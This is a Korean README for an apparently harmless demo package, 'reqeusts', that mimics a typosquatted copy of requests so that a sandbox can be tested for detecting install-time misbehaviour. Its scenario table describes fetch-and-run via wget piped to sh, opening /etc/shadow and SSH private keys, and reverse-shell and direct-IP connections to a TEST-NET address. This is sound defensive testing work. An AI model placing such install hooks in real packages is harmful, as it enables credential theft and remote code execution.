# reqeusts — 타이포스쿼팅 데모 패키지 (무해)

`requests` 의 오타를 노린 악성 패키지를 흉내 낸 **시뮬레이션**이다. 실제 악성 행위는 없다.
`setup.py` 가 설치 단계에서 아래 시나리오를 흉내만 낸다. 목적지는 전부 RFC 5737 TEST-NET 과
예약 도메인(`*.example`)뿐이라 아무것도 받지도 보내지도 못한다.

| id | 행위 |
| --- | --- |
| `shell` | `sh -c "wget … \| sh"` 외부 스크립트 실행 + `/etc/shadow`·`/root/.ssh/id_rsa` 열기(내용은 안 읽음) |
| `revshell` | `203.0.113.7:4444` TCP 접속 시도 (리버스 셸 포트) |
| `direct-ip` | DNS 조회 없이 `203.0.113.7:443` TCP 접속 (IP 직접 유출) |
| `domain` | IANA 예약 도메인 `example.com:443` 접속 — 차단 목록에 올리면 `blocklist-hosts`, 올리기 전엔 정상 통과 |
| `udp` | `203.0.113.7:53`·`:4444` UDP 데이터그램 2개 — 엔진이 TCP 만 보므로 **음성 대조군(미탐)** |

시나리오는 `SG_DEMO_SCENARIOS`(쉼표 구분, 기본 `all`, 순서 유지)로 고른다. 각 시나리오는 시작 전에
`[demo] <id> start` 를 찍는다.

규칙·기대 판정·확인 방법 표는 `../README.md` 를 본다.

## 실행 (반드시 감시 컨테이너 안에서)

```bash
make sandbox-up                          # 가젯 소스 백엔드를 :8000 에 띄운다
tools/sg-install pip ./deploy/demo/reqeusts
# 특정 시나리오만: SG_DEMO_SCENARIOS=direct-ip,udp tools/sg-install pip ./deploy/demo/reqeusts
```

정책에 걸려 컨테이너가 SIGKILL 로 격리되고, `sg-install` 이 위반 목록을 출력하며 종료 코드 2 로 끝난다.
목적지·파일은 전부 무해하므로 개발자 PC 나 네트워크에 영향이 없다.
